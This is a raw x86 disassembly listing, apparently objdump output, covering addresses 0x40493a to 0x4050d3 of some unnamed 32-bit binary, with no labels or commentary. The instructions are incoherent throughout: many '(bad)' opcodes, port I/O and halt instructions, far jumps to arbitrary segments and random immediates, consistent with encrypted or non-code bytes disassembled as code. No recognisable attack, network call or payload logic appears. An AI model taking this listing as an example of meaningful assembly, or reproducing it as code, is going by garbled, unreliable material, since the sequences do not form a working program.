  40493a:	xor    DWORD PTR [edi],eax
  40493c:	retf   
  40493d:	call   0xef4baacc
  404942:	iret   
  404943:	rcr    DWORD PTR [edi-0x5a24246c],cl
  404949:	pop    ecx
  40494a:	pop    ebx
  40494b:	cmc    
  40494c:	push   edx
  40494d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40494e:	lods   al,BYTE PTR ds:[esi]
  40494f:	fcmovbe st,st(7)
  404951:	pop    esi
  404952:	mov    cl,0x3e
  404954:	mov    ds:0x61b6e4b4,al
  404959:	out    0xab,eax
  40495b:	sbb    DWORD PTR [ebp-0x61],ebp
  40495e:	hlt    
  40495f:	imul   ecx,DWORD PTR [edi+eiz*2-0xc],0x1fe2085c
  404967:	or     eax,0xa16f3e8c
  40496c:	bound  ebp,QWORD PTR [ebx]
  40496e:	pop    ss
  40496f:	jp     0x404925
  404971:	pop    ss
  404972:	test   DWORD PTR [esi],esi
  404974:	test   BYTE PTR [ebp+0x1e859c6c],al
  40497a:	rcr    al,cl
  40497c:	push   edi
  40497d:	fwait
  40497e:	stc    
  40497f:	sub    bl,BYTE PTR [edi-0x5869aadd]
  404985:	mov    ecx,0xeb6bc9db
  40498a:	inc    edi
  40498b:	pushf  
  40498c:	fist   DWORD PTR [edx-0x580b9526]
  404992:	test   esi,ebx
  404994:	cld    
  404995:	push   cs
  404996:	mov    WORD PTR [edi-0x39ce3ece],?
  40499c:	sub    BYTE PTR [esi],ch
  40499e:	rol    DWORD PTR [ebx],cl
  4049a0:	sub    DWORD PTR [eax],ebp
  4049a2:	fistp  DWORD PTR [esi*1+0x5be9126d]
  4049a9:	fld    QWORD PTR [ecx+0xd]
  4049ac:	push   0xffffffc1
  4049ae:	(bad)  [esi+0x12]
  4049b1:	mov    dh,0xb
  4049b3:	fbld   TBYTE PTR [ecx-0x7de9e1b5]
  4049b9:	addr16 inc ebp
  4049bb:	xchg   esp,eax
  4049bc:	jecxz  0x404a2d
  4049be:	shl    DWORD PTR [ebx-0x5bd6e49],cl
  4049c4:	jnp    0x4049a6
  4049c6:	jmp    0x4049ba
  4049c8:	push   ecx
  4049c9:	pop    eax
  4049ca:	in     eax,0xd6
  4049cc:	aam    0xbf
  4049ce:	aas    
  4049cf:	xchg   esp,eax
  4049d0:	pusha  
  4049d1:	jmp    0x4049c1
  4049d3:	fcom   QWORD PTR [ebx-0x29093936]
  4049d9:	jl     0x4049ee
  4049db:	push   ss
  4049dc:	dec    esp
  4049dd:	mov    ecx,0x9b9d0c77
  4049e2:	pop    ebx
  4049e3:	leave  
  4049e4:	sbb    edx,0x6
  4049e7:	dec    ecx
  4049e8:	dec    esi
  4049e9:	les    edx,FWORD PTR [ebx-0x7dcf4762]
  4049ef:	in     al,0x3f
  4049f1:	mov    ch,BYTE PTR [esi-0xb6f170a]
  4049f7:	inc    esp
  4049f8:	rcl    DWORD PTR [esp+esi*8+0x54],cl
  4049fc:	dec    esi
  4049fd:	mov    edx,0x95f42a7d
  404a02:	enter  0x384,0x66
  404a06:	mov    cl,0xb6
  404a08:	mov    ah,0xfd
  404a0a:	call   0x161e:0xace5435d
  404a11:	hlt    
  404a12:	sub    DWORD PTR [ebx],esi
  404a14:	cli    
  404a15:	dec    esi
  404a16:	xor    al,0xbc
  404a18:	lds    ebp,FWORD PTR [eax+ebp*1]
  404a1b:	mov    ch,0xe5
  404a1d:	push   esp
  404a1e:	cwde   
  404a1f:	adc    dh,BYTE PTR [edi-0x61b3d371]
  404a25:	nop
  404a26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a27:	add    ecx,DWORD PTR [esp+edi*4+0x22d8f911]
  404a2e:	setb   bh
  404a31:	xor    esi,DWORD PTR [ebp-0x5f7933e]
  404a37:	das    
  404a38:	mov    dl,0x83
  404a3a:	mov    ah,0xb6
  404a3c:	in     al,dx
  404a3d:	jmp    0x4049e8
  404a3f:	xchg   DWORD PTR [edi+ecx*1-0x11],esp
  404a43:	(bad)  
  404a44:	adc    ah,BYTE PTR [ebp+0x6]
  404a47:	xor    ecx,0xffffff9c
  404a4a:	or     eax,0xaf9e6c8
  404a4f:	add    ah,0x9
  404a52:	fadd   DWORD PTR [edx+0x3a]
  404a55:	sar    esp,0xa2
  404a58:	cli    
  404a59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a5a:	out    dx,al
  404a5b:	stos   DWORD PTR es:[edi],eax
  404a5c:	xor    al,0x39
  404a5e:	jle    0x404a7c
  404a60:	push   0x167c3f45
  404a65:	in     al,0x65
  404a67:	imul   ebp,DWORD PTR [esi+0x79],0xa5423350
  404a6e:	mov    eax,ds:0x4972b35d
  404a73:	mov    eax,0x10592341
  404a78:	jmp    0x7d7d:0x5a5665c6
  404a7f:	cmp    DWORD PTR [edx],ebx
  404a81:	or     eax,0x73ce0ab3
  404a86:	push   edx
  404a87:	add    DWORD PTR [edi-0x3d],edi
  404a8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a8b:	gs pop edi
  404a8d:	rcl    BYTE PTR [ebx],cl
  404a8f:	loope  0x404afb
  404a91:	xor    ecx,DWORD PTR [edx+0x73007b13]
  404a97:	pcmpgtw mm3,mm1
  404a9a:	sub    edx,DWORD PTR es:[ebx]
  404a9d:	mov    cl,0x6e
  404a9f:	shr    DWORD PTR [esi+0x2b],1
  404aa2:	es aad 0xf1
  404aa5:	or     al,0xf3
  404aa7:	dec    ebp
  404aa8:	out    dx,al
  404aa9:	pusha  
  404aaa:	pop    ss
  404aab:	jecxz  0x404ad8
  404aad:	mov    bl,0xd2
  404aaf:	sub    eax,0x79ae3d3d
  404ab4:	jecxz  0x404abc
  404ab6:	add    dh,bh
  404ab8:	(bad)  
  404ab9:	iret   
  404aba:	imul   DWORD PTR [edi]
  404abc:	xchg   edi,esp
  404abe:	sbb    al,0x14
  404ac0:	and    edi,esp
  404ac2:	adc    esi,DWORD PTR [edx]
  404ac4:	mov    al,ds:0x4ec51e17
  404ac9:	scas   al,BYTE PTR es:[edi]
  404aca:	mov    BYTE PTR [eax],ah
  404acc:	ja     0x404a6d
  404ace:	inc    ebx
  404acf:	arpl   WORD PTR [edi-0x5b10f83b],bx
  404ad5:	sbb    ebx,DWORD PTR [ecx-0x4a]
  404ad8:	add    eax,0x5979eedc
  404add:	mov    ecx,0x8944f982
  404ae2:	mov    edx,0x20f11b3a
  404ae7:	inc    esi
  404ae8:	pop    edx
  404ae9:	stos   DWORD PTR es:[edi],eax
  404aea:	ins    BYTE PTR es:[edi],dx
  404aeb:	push   esp
  404aec:	adc    al,al
  404aee:	mov    edx,0x15495be1
  404af3:	jge    0x404a99
  404af5:	dec    ebp
  404af6:	jle    0x404b23
  404af8:	ins    DWORD PTR es:[edi],dx
  404af9:	dec    edx
  404afa:	sbb    esi,DWORD PTR [edi]
  404afc:	adc    BYTE PTR [ebx+esi*2-0x12],cl
  404b00:	mov    dh,0xfd
  404b02:	sub    DWORD PTR [edi-0x45],edi
  404b05:	jl     0x404b15
  404b07:	xchg   esp,eax
  404b08:	iret   
  404b09:	sbb    edx,DWORD PTR [eax-0x3a]
  404b0c:	imul   edi,ecx,0xffffffbb
  404b0f:	cdq    
  404b10:	jmp    0xd5cbc42c
  404b15:	cmp    DWORD PTR [edi+0x5b],ebp
  404b18:	dec    ebp
  404b19:	adc    dh,BYTE PTR ds:0x7cf853c1
  404b1f:	call   0x60f55263
  404b24:	jmp    0x404b45
  404b26:	std    
  404b27:	les    ecx,FWORD PTR [eax+0x62]
  404b2a:	(bad)  
  404b2b:	enter  0x2fbc,0x12
  404b2f:	mov    al,ah
  404b31:	cmp    ebx,DWORD PTR [ebx]
  404b33:	mov    al,ds:0xd7ae23bf
  404b38:	cmp    BYTE PTR [eax],dl
  404b3a:	scas   eax,DWORD PTR es:[edi]
  404b3b:	sub    dh,BYTE PTR [eax+0x3b6aa800]
  404b41:	bound  eax,QWORD PTR [eax+0x1093b693]
  404b47:	pop    edx
  404b48:	outs   dx,BYTE PTR ds:[esi]
  404b49:	aad    0xca
  404b4b:	jbe    0x404b92
  404b4d:	mov    ds,WORD PTR [ecx]
  404b4f:	mov    ds:0x68676559,eax
  404b54:	inc    edi
  404b55:	add    bl,BYTE PTR [esi-0x281b9330]
  404b5b:	enter  0x5aff,0xf0
  404b5f:	or     cl,dh
  404b61:	nop
  404b62:	pop    ebp
  404b63:	imul   ebx,DWORD PTR [ecx-0x161c488d],0xb327465c
  404b6d:	int3   
  404b6e:	in     al,dx
  404b6f:	pop    ebx
  404b70:	jns    0x404b28
  404b72:	jmp    0x981e7243
  404b77:	dec    ecx
  404b78:	push   0xffffff8b
  404b7a:	and    BYTE PTR [edx-0x5a9efc79],al
  404b80:	imul   eax,DWORD PTR [ebx],0xcf47d9ce
  404b86:	cmp    bh,BYTE PTR [ecx]
  404b88:	jg     0x404bdd
  404b8a:	pop    esp
  404b8b:	push   es
  404b8c:	scas   eax,DWORD PTR es:[edi]
  404b8d:	fisttp QWORD PTR [edx]
  404b8f:	or     eax,0xa6877b5b
  404b94:	pushf  
  404b95:	push   edi
  404b96:	sub    edx,ebp
  404b98:	scas   al,BYTE PTR es:[edi]
  404b99:	repz cwde 
  404b9b:	das    
  404b9c:	add    eax,0x512c9afd
  404ba1:	dec    edi
  404ba2:	lods   eax,DWORD PTR ds:[esi]
  404ba3:	bound  edx,QWORD PTR [esp+edi*1-0x3e]
  404ba7:	ror    BYTE PTR [edx-0x22],cl
  404baa:	push   edi
  404bab:	ja     0x404b98
  404bad:	adc    cl,dh
  404baf:	xor    ecx,DWORD PTR [edx]
  404bb1:	adc    BYTE PTR [ebp+0x439f339d],dl
  404bb7:	push   DWORD PTR [edi-0x3fe74fbd]
  404bbd:	jg     0x404bf6
  404bbf:	enter  0x65ea,0xca
  404bc3:	idiv   ah
  404bc5:	jg     0x404c44
  404bc7:	repnz dec ecx
  404bc9:	and    ah,cl
  404bcb:	pop    esi
  404bcc:	xchg   edi,eax
  404bcd:	sub    bl,dh
  404bcf:	aaa    
  404bd0:	cld    
  404bd1:	ins    DWORD PTR es:[edi],dx
  404bd2:	int3   
  404bd3:	adc    dh,BYTE PTR [ebp+0x38]
  404bd6:	jecxz  0x404bd1
  404bd8:	jne    0x404b5b
  404bda:	pop    ebx
  404bdb:	fistp  DWORD PTR [ebx]
  404bdd:	jle    0x404bb1
  404bdf:	in     al,dx
  404be0:	ret    
  404be1:	ss push ds
  404be3:	or     edx,DWORD PTR [eax]
  404be5:	retf   0xf253
  404be8:	outs   dx,DWORD PTR ds:[esi]
  404be9:	cdq    
  404bea:	stc    
  404beb:	stc    
  404bec:	cwde   
  404bed:	loop   0x404c3e
  404bef:	xchg   esp,eax
  404bf0:	jae    0x404bee
  404bf2:	out    0x41,al
  404bf4:	xchg   ebx,eax
  404bf5:	xchg   BYTE PTR [ebp-0x7314b9af],ah
  404bfb:	xchg   esi,eax
  404bfc:	lods   al,BYTE PTR ds:[esi]
  404bfd:	fwait
  404bfe:	jmp    0x404bc5
  404c00:	fild   QWORD PTR [ecx]
  404c02:	out    dx,al
  404c03:	and    al,0x50
  404c05:	push   ds
  404c06:	test   DWORD PTR [esi],edx
  404c08:	js     0x404c72
  404c0a:	je     0x404bd2
  404c0c:	or     cl,cl
  404c0e:	mov    al,0xb2
  404c10:	mov    edi,0xbe502e0c
  404c15:	mov    ds,WORD PTR [eax+ebp*8-0x5d]
  404c19:	or     al,0xea
  404c1b:	ds aad 0x4e
  404c1e:	xchg   ebp,eax
  404c1f:	xchg   ebp,eax
  404c20:	mov    ebp,0x1aa298a0
  404c25:	outs   dx,BYTE PTR ds:[esi]
  404c26:	js     0x404c03
  404c28:	test   DWORD PTR [esi-0x5b3d81b9],ecx
  404c2e:	div    BYTE PTR [ecx-0x20]
  404c31:	dec    esi
  404c32:	mov    cl,0xbf
  404c34:	adc    DWORD PTR [ebx-0x23],eax
  404c37:	adc    cl,BYTE PTR [eax+0x8b198cb]
  404c3d:	aam    0x38
  404c3f:	stos   DWORD PTR es:[edi],eax
  404c40:	ud0    ebp,DWORD PTR [edi+0x56fb5f48]
  404c47:	push   0xe246020f
  404c4c:	fiadd  DWORD PTR [eax+eiz*8+0x4cd3e43c]
  404c53:	mov    ecx,0xbf44dac6
  404c58:	fcom   QWORD PTR [eiz*1-0x5f779589]
  404c5f:	dec    ebx
  404c60:	aad    0x8e
  404c62:	or     eax,0xe3936661
  404c67:	mov    ah,0x4b
  404c69:	jne    0x404c13
  404c6b:	add    ebp,DWORD PTR [edx+0x5b2031ac]
  404c71:	add    eax,0x41e88f73
  404c76:	xlat   BYTE PTR ds:[ebx]
  404c77:	retf   
  404c78:	enter  0x5abb,0xcc
  404c7c:	mov    ebp,0xbd60581b
  404c81:	jmp    0x6be2ab1b
  404c86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c87:	aam    0x3b
  404c89:	leave  
  404c8a:	jecxz  0x404c12
  404c8c:	sti    
  404c8d:	dec    edi
  404c8e:	pop    eax
  404c8f:	ffree  st(3)
  404c91:	pop    ebp
  404c92:	loopne 0x404c33
  404c94:	hlt    
  404c95:	jne    0x404d11
  404c97:	cmp    bh,BYTE PTR [eax-0x3]
  404c9a:	pop    ebx
  404c9b:	loopne 0x404c60
  404c9d:	in     eax,dx
  404c9e:	shr    BYTE PTR [ecx+0x75],0xb2
  404ca2:	mov    eax,ds:0xdda0ff12
  404ca7:	sbb    ch,bh
  404ca9:	fcom   QWORD PTR [edi-0x26a631d8]
  404caf:	shl    BYTE PTR [ebp+0x14a3f6d8],1
  404cb5:	mov    bh,0x90
  404cb7:	out    0xa9,al
  404cb9:	cdq    
  404cba:	aad    0x8d
  404cbc:	das    
  404cbd:	jl     0x404d35
  404cbf:	and    al,0x9
  404cc1:	sub    DWORD PTR [ebp+0x718c89c9],ecx
  404cc7:	rol    BYTE PTR [esi-0x416d64c],0xee
  404cce:	jb     0x404cec
  404cd0:	mov    ah,0x6e
  404cd2:	push   cs
  404cd3:	imul   eax,DWORD PTR [edx],0xffffff85
  404cd6:	and    eax,0x8a8a3653
  404cdb:	ins    BYTE PTR es:[edi],dx
  404cdc:	mov    gs,edi
  404cde:	cmp    DWORD PTR [edi+0x45],ebp
  404ce1:	push   esp
  404ce2:	or     al,0x95
  404ce4:	adc    DWORD PTR [esi-0x44],esi
  404ce7:	push   es
  404ce8:	sbb    BYTE PTR [ebp-0x25],bl
  404ceb:	or     DWORD PTR [eax+ebx*1-0x5e28e43d],eax
  404cf2:	or     al,0x7c
  404cf4:	push   ecx
  404cf5:	or     bl,BYTE PTR [ecx+0x6a8774c8]
  404cfb:	out    dx,eax
  404cfc:	fwait
  404cfd:	xchg   ebp,eax
  404cfe:	lahf   
  404cff:	add    al,0x83
  404d01:	sbb    ebp,esp
  404d03:	sub    cl,cl
  404d05:	dec    eax
  404d06:	repnz cmp DWORD PTR [eax+ecx*1-0xe8bf5c],eax
  404d0e:	dec    esi
  404d0f:	mov    ebx,0x72ef1168
  404d14:	push   ebp
  404d15:	jecxz  0x404cee
  404d17:	fsubr  DWORD PTR [ebx]
  404d19:	cmp    BYTE PTR fs:[esi+eax*2],bh
  404d1d:	inc    BYTE PTR [edi+0x31ad3d43]
  404d23:	inc    ebp
  404d24:	sbb    esp,DWORD PTR [edx-0x6e95760a]
  404d2a:	jg     0x404d0d
  404d2c:	ds pop edi
  404d2e:	jle    0x404cea
  404d30:	int    0x86
  404d32:	jnp    0x404cef
  404d34:	add    ebx,ecx
  404d36:	rcl    BYTE PTR [edi-0x11],0xc4
  404d3a:	out    0x36,al
  404d3c:	jge    0x404d5b
  404d3e:	jp     0x404ce1
  404d40:	sahf   
  404d41:	mov    eax,0x33b1e9de
  404d46:	jle    0x404d57
  404d48:	inc    ecx
  404d49:	(bad)  
  404d4a:	mov    ds:0xef98a361,al
  404d4f:	aas    
  404d50:	sbb    al,0x82
  404d52:	xor    BYTE PTR [ecx-0x40fa02b2],0x7c
  404d59:	scas   al,BYTE PTR es:[edi]
  404d5a:	fild   WORD PTR [eax]
  404d5d:	xchg   DWORD PTR [ebx-0x76],eax
  404d60:	mov    WORD PTR [edx+0x48],cs
  404d63:	cwde   
  404d64:	inc    edi
  404d65:	dec    ebx
  404d66:	fnstcw WORD PTR [ecx+ecx*4-0x4c63cd83]
  404d6d:	out    dx,eax
  404d6e:	sub    dl,BYTE PTR [eax+edi*2-0x286546b8]
  404d75:	fild   DWORD PTR [ebx]
  404d77:	jecxz  0x404d8e
  404d79:	xchg   si,ax
  404d7b:	std    
  404d7c:	or     bh,ch
  404d7e:	add    dh,cl
  404d80:	and    bl,BYTE PTR [edi-0x5e]
  404d83:	aas    
  404d84:	xchg   ebx,eax
  404d85:	in     al,dx
  404d86:	loopne 0x404d60
  404d88:	out    dx,eax
  404d89:	jns    0x404d5f
  404d8b:	mov    eax,0xec7c7e9e
  404d90:	cwde   
  404d91:	(bad)  
  404d92:	fcomp  DWORD PTR [ecx]
  404d94:	xchg   edx,eax
  404d95:	stos   DWORD PTR es:[edi],eax
  404d96:	sub    eax,0x959fbe2b
  404d9b:	repz (bad) [ecx+0x3e]
  404d9f:	jg     0x404d74
  404da1:	jecxz  0x404d71
  404da3:	push   es
  404da4:	clc    
  404da5:	shl    ecx,cl
  404da7:	mov    ah,0x9b
  404da9:	push   ecx
  404daa:	sar    al,cl
  404dac:	xchg   esp,eax
  404dad:	and    DWORD PTR [eax-0x78],esp
  404db0:	pop    eax
  404db1:	js     0x404dbc
  404db3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404db4:	inc    ebp
  404db5:	xchg   edi,eax
  404db6:	sub    ecx,DWORD PTR [ebp+edx*1-0x65]
  404dba:	cmp    al,BYTE PTR [ebp+ebx*8-0x70]
  404dbe:	jmp    0x3275e921
  404dc3:	xchg   edx,eax
  404dc4:	xor    ebp,edi
  404dc6:	arpl   WORD PTR [esi+0x7a],si
  404dc9:	lock lock pop es
  404dcc:	sub    ebx,eax
  404dce:	imul   esi,DWORD PTR [edx-0x75],0xfffffff7
  404dd2:	stos   BYTE PTR es:[edi],al
  404dd3:	push   ss
  404dd4:	inc    edi
  404dd5:	dec    ebx
  404dd6:	and    edi,DWORD PTR [ebx]
  404dd8:	data16 ins BYTE PTR es:[edi],dx
  404dda:	in     al,0xe9
  404ddc:	mov    cl,0xea
  404dde:	jno    0x404dab
  404de0:	sub    DWORD PTR [esi],ecx
  404de2:	retf   0x102f
  404de5:	fs xchg esi,eax
  404de7:	mov    DWORD PTR [eax],eax
  404de9:	clc    
  404dea:	sbb    DWORD PTR [ecx-0x76],eax
  404ded:	(bad)  
  404dee:	shl    DWORD PTR [edi],0xca
  404df1:	inc    eax
  404df2:	push   edx
  404df3:	pusha  
  404df4:	pushf  
  404df5:	cs repnz mov ch,0xbc
  404df9:	aam    0x82
  404dfb:	retf   0xa30a
  404dfe:	(bad)  
  404dff:	jmp    0x94c3:0x2a0b8f55
  404e06:	sub    eax,0x5118039d
  404e0b:	mov    cl,0x7c
  404e0d:	adc    esi,DWORD PTR [edx-0x4cb98c94]
  404e13:	fist   DWORD PTR [ecx+0x7990c926]
  404e19:	loope  0x404df1
  404e1b:	xchg   esp,eax
  404e1c:	jnp    0x404e48
  404e1e:	or     eax,0x24857452
  404e23:	scas   al,BYTE PTR es:[edi]
  404e24:	(bad)  [ebx]
  404e26:	cmp    ah,0xd0
  404e29:	pop    eax
  404e2a:	cmc    
  404e2b:	iret   
  404e2c:	or     BYTE PTR [esi],ah
  404e2e:	icebp  
  404e2f:	or     edi,DWORD PTR [esp+eiz*8+0x215bbe0a]
  404e36:	pop    ebx
  404e37:	xchg   ecx,eax
  404e38:	pop    esp
  404e39:	add    al,0x2
  404e3b:	sbb    BYTE PTR [ecx],al
  404e3d:	cld    
  404e3e:	outs   dx,DWORD PTR ds:[esi]
  404e3f:	mov    bh,0x6f
  404e41:	icebp  
  404e42:	xor    BYTE PTR [ebx+0x25],dl
  404e45:	loopne 0x404ddd
  404e47:	outs   dx,DWORD PTR ds:[esi]
  404e48:	loope  0x404dce
  404e4a:	stos   DWORD PTR es:[edi],eax
  404e4b:	push   esp
  404e4c:	mov    ah,0x78
  404e4e:	push   ss
  404e4f:	outs   dx,DWORD PTR ds:[esi]
  404e50:	and    eax,0x1d6be6d6
  404e55:	call   0x63c32803
  404e5a:	test   DWORD PTR [ebp-0x55],ebx
  404e5d:	mov    eax,ds:0x73ec1668
  404e62:	iret   
  404e63:	in     eax,0x8
  404e65:	sti    
  404e66:	mov    al,0x38
  404e68:	add    eax,0xccb19c40
  404e6d:	and    DWORD PTR [ebx-0xc619e41],ebp
  404e73:	jge    0x404e8f
  404e75:	aaa    
  404e76:	jp     0x404e45
  404e78:	jns    0x404eb1
  404e7a:	adc    edi,eax
  404e7c:	adc    esi,ebp
  404e7e:	les    ebx,FWORD PTR [edi]
  404e80:	mov    DWORD PTR [eax+edi*2-0x28d837e4],edx
  404e87:	aas    
  404e88:	dec    edi
  404e89:	jns    0x404e44
  404e8b:	push   ebp
  404e8c:	xor    DWORD PTR [ebx-0x66],0x63b8b0e6
  404e93:	jb     0x404eb1
  404e95:	lds    esi,FWORD PTR [edx-0x65a4525]
  404e9b:	dec    ebp
  404e9c:	or     dl,BYTE PTR [ebp-0x7e]
  404e9f:	or     bh,cl
  404ea1:	lods   al,BYTE PTR ds:[esi]
  404ea2:	aas    
  404ea3:	int    0xf6
  404ea5:	push   ss
  404ea6:	push   ebx
  404ea7:	rcr    BYTE PTR [ecx],0xa2
  404eaa:	repz fmul st,st(4)
  404ead:	sub    ah,dh
  404eaf:	scas   al,BYTE PTR es:[edi]
  404eb0:	fsub   st,st(1)
  404eb2:	mov    cl,BYTE PTR [esp+ebx*1]
  404eb5:	clc    
  404eb6:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404eb8:	into   
  404eb9:	fisubr DWORD PTR [eax+0x1e]
  404ebc:	cmp    bl,cl
  404ebe:	fwait
  404ebf:	pusha  
  404ec0:	lods   eax,DWORD PTR ds:[esi]
  404ec1:	lock or cl,BYTE PTR ds:[eax]
  404ec5:	jo     0x404f0a
  404ec7:	fisttp DWORD PTR [esi+edi*1-0x5611953d]
  404ece:	push   esp
  404ecf:	daa    
  404ed0:	outs   dx,BYTE PTR ds:[esi]
  404ed1:	pop    ebp
  404ed2:	in     al,dx
  404ed3:	add    BYTE PTR [ebx+ecx*1-0x34f37ed6],0xc2
  404edb:	fild   DWORD PTR [edx-0x2e37a699]
  404ee1:	(bad)
  404ee5:	das    
  404ee6:	aad    0x78
  404ee8:	mov    ecx,0xdbd399dd
  404eed:	xchg   esi,eax
  404eee:	mov    dl,BYTE PTR [edi]
  404ef0:	repnz mov cl,BYTE PTR [edi-0x75]
  404ef4:	sbb    eax,0xef96fc6c
  404ef9:	push   ds
  404efa:	loopne 0x404eb3
  404efc:	outs   dx,BYTE PTR ds:[esi]
  404efd:	(bad)  
  404efe:	out    0x80,al
  404f00:	clc    
  404f01:	lock aaa 
  404f03:	loopne 0x404f53
  404f05:	iret   
  404f06:	shr    DWORD PTR [edi+0x4d],cl
  404f09:	sti    
  404f0a:	pop    ebx
  404f0b:	enter  0x4f38,0x39
  404f0f:	int3   
  404f10:	fidiv  DWORD PTR [ebx+edx*8+0x38a095e2]
  404f17:	rcl    DWORD PTR [ebx-0x28],0x8b
  404f1b:	ss mov eax,0x67a62156
  404f21:	aad    0xca
  404f23:	bound  esp,QWORD PTR [esi-0x1a389955]
  404f29:	adc    al,0xe
  404f2b:	ds inc edx
  404f2d:	mov    eax,0x97b64280
  404f32:	dec    ebp
  404f33:	jecxz  0x404ebe
  404f35:	mov    cr6,ebp
  404f38:	push   ebx
  404f39:	js     0x404f4a
  404f3b:	mov    al,0xc6
  404f3d:	xchg   DWORD PTR [bp+0x41b5],edx
  404f42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f43:	cld    
  404f44:	nop
  404f45:	dec    ebp
  404f46:	cmp    DWORD PTR [edx],ecx
  404f48:	dec    ecx
  404f49:	sbb    edx,esp
  404f4b:	aad    0xa8
  404f4d:	aaa    
  404f4e:	lahf   
  404f4f:	pop    ds
  404f50:	idiv   DWORD PTR [edx+0x17e5dd68]
  404f56:	or     al,0x8a
  404f58:	mov    esi,0x923b9a58
  404f5d:	cmp    DWORD PTR [ebx+0x455d57c],ecx
  404f63:	sbb    edx,DWORD PTR [ecx]
  404f65:	xlat   BYTE PTR ds:[ebx]
  404f66:	enter  0x2979,0x13
  404f6a:	leave  
  404f6b:	cwde   
  404f6c:	jnp    0x404f3c
  404f6e:	call   0x532d7b5c
  404f73:	sbb    eax,0xabf5182b
  404f78:	jl     0x404fa9
  404f7a:	lds    eax,FWORD PTR [ebp-0x526d44d3]
  404f80:	sbb    eax,0xfc4a0da3
  404f85:	mov    ds:0x3389c882,al
  404f8a:	mov    ebx,0xd7ae3d7b
  404f8f:	lea    ebx,[ecx-0x6d35e1d8]
  404f95:	inc    BYTE PTR [edi+0x2409d38f]
  404f9b:	xor    al,0xde
  404f9d:	in     al,dx
  404f9e:	pop    eax
  404f9f:	js     0x404f4c
  404fa1:	push   es
  404fa2:	push   cs
  404fa3:	int    0xc1
  404fa5:	cli    
  404fa6:	cmc    
  404fa7:	repz mov eax,ds:0xcea29744
  404fad:	(bad)  
  404fae:	jl     0x404f72
  404fb0:	mov    DWORD PTR [eax-0x55],esi
  404fb3:	rcr    BYTE PTR [ebx],cl
  404fb5:	cmp    dh,BYTE PTR [esi*2+0x5014d4d7]
  404fbc:	scas   eax,DWORD PTR es:[edi]
  404fbd:	push   esp
  404fbe:	pop    ecx
  404fbf:	fbstp  TBYTE PTR [esp+ebp*4-0x10]
  404fc3:	and    BYTE PTR [ecx],ah
  404fc5:	mov    cl,0xea
  404fc7:	cmp    eax,0xf8c1deb9
  404fcc:	adc    eax,0xd3e6a5b8
  404fd1:	loop   0x404fd4
  404fd3:	or     eax,0x8c2f98fd
  404fd8:	repnz xchg edi,eax
  404fda:	in     al,0x2a
  404fdc:	or     BYTE PTR [edi],bl
  404fde:	sbb    al,0xb8
  404fe0:	dec    esi
  404fe1:	mov    ecx,DWORD PTR [eax-0x13]
  404fe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fe5:	jp     0x404f7a
  404fe7:	sti    
  404fe8:	push   ebp
  404fe9:	sbb    eax,0x4a6191c2
  404fee:	xor    eax,0x88b0d377
  404ff3:	jae    0x404f80
  404ff5:	bound  eax,QWORD PTR [esi-0x59]
  404ff8:	add    al,0x23
  404ffa:	test   al,0x64
  404ffc:	xor    al,0x95
  404ffe:	into   
  404fff:	xor    DWORD PTR [edi+0x69e20bb4],0xffffffda
  405006:	out    dx,eax
  405007:	adc    bh,BYTE PTR [ecx]
  405009:	ds mov dl,0xcb
  40500c:	lea    eax,[edx+0x5d]
  40500f:	mov    ecx,0xbf60ea40
  405014:	sar    DWORD PTR [ebx],0x58
  405017:	pop    ss
  405018:	adc    BYTE PTR [ebx+eax*8-0x61],0xe1
  40501d:	cmp    esi,DWORD PTR [edi]
  40501f:	add    al,0xe3
  405021:	(bad)  
  405022:	outs   dx,BYTE PTR ds:[esi]
  405023:	adc    dh,BYTE PTR [ecx]
  405025:	push   ss
  405026:	mov    dl,0x3a
  405028:	loop   0x405011
  40502a:	adc    eax,0x6efccdb9
  40502f:	jl     0x405079
  405031:	lods   eax,DWORD PTR ds:[esi]
  405032:	inc    esi
  405033:	xchg   esi,eax
  405034:	lahf   
  405035:	xor    esp,DWORD PTR [edx+ebp*2+0x5fea8b1c]
  40503c:	or     al,BYTE PTR [ecx-0x20]
  40503f:	cdq    
  405040:	and    al,0x35
  405042:	or     BYTE PTR [eax-0x40],al
  405045:	mov    ?,WORD PTR [ebp-0x14]
  405048:	(bad)  
  405049:	stos   DWORD PTR es:[edi],eax
  40504a:	sub    edi,DWORD PTR [esi]
  40504c:	mov    esi,0xb7283b49
  405051:	mov    ah,0xd8
  405053:	jg     0x5939bbab
  405059:	outs   dx,DWORD PTR ds:[esi]
  40505a:	(bad)  
  40505b:	jge    0x405006
  40505d:	dec    esi
  40505e:	cdq    
  40505f:	pop    ebx
  405060:	in     al,0x64
  405062:	sbb    BYTE PTR [ecx],bh
  405064:	cld    
  405065:	sub    DWORD PTR [ebp-0x15],ecx
  405068:	je     0x40503b
  40506a:	pop    ebx
  40506b:	inc    ebx
  40506c:	mov    ds:0xf7d906de,eax
  405071:	pop    esp
  405072:	imul   edi,DWORD PTR [ebp+0x4f914c9c],0x149fa2d7
  40507c:	lods   al,BYTE PTR ds:[esi]
  40507d:	sub    eax,0x825b9a84
  405082:	jle    0x40506b
  405084:	or     eax,0xcc1bd939
  405089:	ret    
  40508a:	mov    bl,0x9e
  40508c:	mov    edx,0x4b771135
  405091:	test   eax,0x2a8c206a
  405096:	mov    edi,0x32b4fe45
  40509b:	jns    0x4050e0
  40509d:	call   0x28037138
  4050a2:	and    edx,DWORD PTR [eax+0x1f2d45fc]
  4050a8:	inc    esp
  4050a9:	xchg   edi,eax
  4050aa:	js     0x405040
  4050ac:	sbb    dh,BYTE PTR [ebx+esi*1]
  4050af:	je     0x4050e3
  4050b1:	pushf  
  4050b2:	int    0x77
  4050b4:	dec    esi
  4050b5:	(bad)  
  4050b7:	jmp    0x161c:0xca0ba3da
  4050be:	cmc    
  4050bf:	inc    edx
  4050c0:	(bad)  
  4050c1:	adc    eax,0x5ba865aa
  4050c6:	loopne 0x405113
  4050c8:	mov    bl,0x7e
  4050ca:	lahf   
  4050cb:	in     al,dx
  4050cc:	cmp    BYTE PTR [ebx+0x1ae46fca],0x6b
  4050d3:	cs jmp 0x40509c
